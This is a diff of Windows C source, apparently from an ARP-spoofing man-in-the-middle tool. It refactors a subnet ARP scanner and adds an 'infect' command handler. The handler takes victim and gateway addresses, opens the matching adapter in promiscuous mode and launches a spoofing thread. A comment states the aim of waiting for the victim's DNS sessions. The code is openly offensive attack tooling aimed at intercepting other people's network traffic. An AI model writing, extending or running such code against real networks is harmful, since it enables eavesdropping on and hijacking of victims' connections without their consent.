@@ -19,47 +19,14 @@
 #include "network_headers.h"
 #include "ipc_manage.h"
 #include "commands.h"
+#include "arp_spoof.h"
+#include "utils.h"
 
-
-typedef struct
-{
-	u_long ip;
-	BYTE mac_addr[ETH_ALEN];
-} host;
-
-typedef struct
-{
-	pcap_t* fp;
-	PIP_ADAPTER_INFO adapter;
-} send_params;
 
 //globals
 static HANDLE act_threads[ACTS_NUM];
-static send_params parameters;
-
-static PIP_ADAPTER_INFO correspoding_adapter(pcap_if_t* pcap_adapter, PIP_ADAPTER_INFO pAdapters)
-{
-	const char* str1 = pcap_adapter->name;
-	const char* str2;
-	size_t i;
-	
-	str1 += strlen(str1) - 1; 
-	while (pAdapters)
-	{
-		i = 0;
-		str2 = pAdapters->AdapterName;
-		str2 += strlen(str2) - 1;
-
-		while (*(str1-i) == *(str2-i) && *(str1-i) != '{')
-			i++;
-
-		if (*(str1-i) == *(str2-i))
-			return pAdapters;
-
-		pAdapters = pAdapters->Next;
-	}
-	return NULL;
-}
+static send_params send_packets_params;
+send_params infect_params;
 
 static DWORD WINAPI send_packets(LPVOID lparam)
 {
@@ -68,12 +35,12 @@ static DWORD WINAPI send_packets(LPVOID lparam)
 	arp_ether_ipv4* arp_header;
 	u_char packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
 	
-	addr_lst = &parameters.adapter->IpAddressList;
+	addr_lst = &send_packets_params.adapter->IpAddressList;
 	ether_header = (ether_hdr*)packet;
 	arp_header = (arp_ether_ipv4*)(packet + sizeof(ether_hdr));
 
 	//ETHERNET LAYER
-	memcpy(ether_header->src_addr, parameters.adapter->Address, ETH_ALEN); //this adapter's mac
+	memcpy(ether_header->src_addr, send_packets_params.adapter->Address, ETH_ALEN); //this adapter's mac
 	memset(ether_header->dest_addr, 0xff, ETH_ALEN); //broadcast
 	ether_header->frame_type = htons(ETH_P_ARP); //LAYER3:ARP (0x0806)
 
@@ -102,7 +69,7 @@ static DWORD WINAPI send_packets(LPVOID lparam)
 		while (netmask != 0xffffffff)
 		{
 			arp_header->tpa = htonl(target);
-			pcap_sendpacket(parameters.fp, packet, sizeof(packet));
+			pcap_sendpacket(send_packets_params.fp, packet, sizeof(packet));
 			target++;
 			netmask++;
 		}
@@ -179,8 +146,8 @@ DWORD WINAPI scan(LPVOID lparam)
 		}
 
 		/*update globals for send_packet*/
-		parameters.adapter = correspoding_adapter(alldevs, pAdapterInfo);
-		parameters.fp = fp;
+		send_packets_params.adapter = correspoding_adapter(alldevs, pAdapterInfo);
+		send_packets_params.fp = fp;
 
 		/*start send_packet thread*/
 		HANDLE hThread;
@@ -239,6 +206,60 @@ DWORD WINAPI scan(LPVOID lparam)
 DWORD WINAPI infect(LPVOID lparam)
 {
 	pCommand command = (pCommand)lparam;
+
+	PIP_ADAPTER_INFO pAdapterInfo = NULL;
+	ULONG outBufLen = 0;
+	GetAdaptersInfo(pAdapterInfo, &outBufLen);
+	pAdapterInfo = (PIP_ADAPTER_INFO)malloc(outBufLen);
+	if (!pAdapterInfo)
+		return -1;
+	GetAdaptersInfo(pAdapterInfo, &outBufLen);
+
+	pcap_t* fp;
+	pcap_if_t* alldevs = NULL, * adapter;
+	pcap_addr_t* addr;
+	
+	pcap_findalldevs(&alldevs, NULL);
+	
+	if (!alldevs)
+		return -1;
+
+	for (adapter = alldevs; adapter; adapter = adapter->next)
+	{
+		int found = 0; //false
+		for (addr = adapter->addresses; addr; addr = addr->next)
+		{
+			ULONG netmask, host;
+			host = ((struct sockaddr_in*)(addr->addr))->sin_addr.s_addr;
+			netmask = ((struct sockaddr_in*)(addr->netmask))->sin_addr.s_addr;
+
+			if ((host & netmask) == (command->victim_ip & netmask))
+				found = 1; //true
+		}
+		if (found)
+			break;
+	}
+
+	/*open the adapter*/
+	fp = pcap_open(
+		adapter->name,
+		sizeof(ether_hdr) + sizeof(arp_ether_ipv4),
+		PCAP_OPENFLAG_PROMISCUOUS,
+		5000,
+		NULL,
+		NULL
+	);
+
+	infect_params.fp = fp;
+	infect_params.adapter = correspoding_adapter(adapter, pAdapterInfo);
+	
+	/*start send_packet thread*/
+	HANDLE hThread;
+	hThread = CreateThread(NULL, 0, start_spoof, NULL, 0, NULL);
+	if (!hThread)
+		pcap_close(fp);
+
+	//deal with routing stuff (wait for DNS sessions)
 	return 0;
 }
 
@@ -265,6 +286,11 @@ void execute_command(pCommand command)
 		//check if thread not active
 		if (GetExitCodeThread(act_threads[INFECT], NULL) != STILL_ACTIVE)
 		{
+			infect_params.gateway_ip = command->gateway_ip;
+			infect_params.victim_ip = command->victim_ip;
+			memcpy(infect_params.gateway_mac, command->gateway_mac, ETH_ALEN);
+			memcpy(infect_params.victim_mac, command->victim_mac, ETH_ALEN);
+
 			act_threads[INFECT] = CreateThread(
 				NULL,
 				0,
